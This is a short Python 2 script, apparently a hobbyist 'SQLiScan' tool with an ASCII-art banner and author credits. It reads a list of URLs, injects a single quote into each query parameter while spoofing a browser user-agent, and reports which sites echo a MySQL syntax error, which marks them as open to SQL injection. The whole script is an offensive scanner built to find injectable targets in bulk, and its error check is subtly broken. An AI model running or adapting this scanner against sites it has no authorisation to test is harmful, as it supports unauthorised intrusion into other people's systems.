import requests
import sys
import re

print r"""

 .oooooo..o   .oooooo.      ooooo         o8o   .oooooo..o                                 
d8P'    `Y8  d8P'  `Y8b     `888'         `"'  d8P'    `Y8                                 
Y88bo.      888      888     888         oooo  Y88bo.       .ooooo.   .oooo.   ooo. .oo.   
 `"Y8888o.  888      888     888         `888   `"Y8888o.  d88' `"Y8 `P  )88b  `888P"Y88b  
     `"Y88b 888      888     888          888       `"Y88b 888        .oP"888   888   888  
oo     .d8P `88b    d88b     888       o  888  oo     .d8P 888   .o8 d8(  888   888   888  
8""88888P'   `Y8bood8P'Ybd' o888ooooood8 o888o 8""88888P'  `Y8bod8P' `Y888""8o o888o o888o 
                                                                          v0.1                                                                                

                    `"-._                    
                      `. "-._                
                        T.   "-.             
                         $$p.   "-.          
                         $$$$b.    `,        
                      .g$$$$$$$b    ;        _______________________________________ 
                    .d$$$$$$$$$$;   ;       |                                       |
                    .d$$$$$$$$$$;           | Developed by: ArthurHMES              |
                 __d$$$$$$P""^T$$   :       | Twitter: @Thuur1337                   |
               .d$$$$P^^""___       :       | Github: http://github.com/ArthurHMES  |                                                                                                          
              d$P'__..gg$$$$$$$$$$; ;       |_______________________________________| 
             d$$ :$$$$$$$$$$$$$$$$;  ;      
            :$$; $$$$$$$$$$$$$$$$P  :$                   
            $$$  $$$$$$$$$$$$$$$$b  $$       
           :$$$ :$$$$$$$$$$$$$$$$$; $$;      
           $$$; $$$$$$$$$$$$$$$$$$; $$;      
          :$$$  $$$$$$$$$^$$$$$$$$$ :$$      
          $$$; :$$$p__gP' `Tp__g$$$ :$$                                 
         :$$$  $$P`T$P' .$. `T$P'T$; $$;     
         $$$; :$$;     :P^T;     :$; $$;     
        :$$$  $$$$-.           .-$$$ :$$     
        $$$$ :$$$$; \   T$P   / :$$$  $$     
       :$$$; $$$$$$  ; b:$;d :  $$$$; $$;    
       $$$$; $$$$$$; : T T T ; :$$$$$ :$$    
    .g$$$$$  :$$$$$$  ;' | ':  $$$$$$  T$b   
 .g$$$$$$$$   $$$$$$b :     ; d$$$$$;   `Tb  
:$$$$$$$$$;   :$$$$$$$;     :$$$$$$P       \ 
:$$$$$$$$$;    T$$$$$$$p._.g$$$$$$P         ;
$$$P^^T$$$$p.   `T$$$$$$$$$$$$$$P'     _/`. :
       `T$$$$$b.  `T$$$$$$$$$$P'    .g$P   \;
        `T$$$$$b.  "^T$$$$P^"     d$P'      
           `T$$$$$b.             .dP'        
             "^T$$$$b.        .g$P'          
                "^T$$$b    .g$P^"            
                   "^T$b.g$P^"               
                      "^$^"                  

"""



argumentos = sys.argv

try:
    list = argumentos[1]
except:
    print "3rr0r =( !! Use -> FindSQLi.py list.txt <-"

try:
    arquivo = open (list)
    linhas = arquivo.read().splitlines()
except:
    print list + " N0t F0und!"



for linha in linhas:
    url = linha
    default = re.search(r'([\w:/\._-]+\?[\w_-]+=)([\w_-]+)', url)
    injection = default.groups()[0] + '\''
    header = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                            'AppleWebKit/537.36 (KHTML, like Gecko) '
                            'Chrome/51.0.2704.103 Safari/537.36'}

    req = requests.get(injection, headers=header)
    html = req.text


    if "mysql_fetch_array()" and "You have an error in your SQL syntax" in html:
        print '\033[32m' + "1337 Say: " + '\033[0;0m' + "[ "+linha+" ]"  + "-> Error found!"
    else:
        print '\033[31m' + "1337 Say: " + '\033[0;0m' + "[ "+linha+" ]" + " -> Error not found!"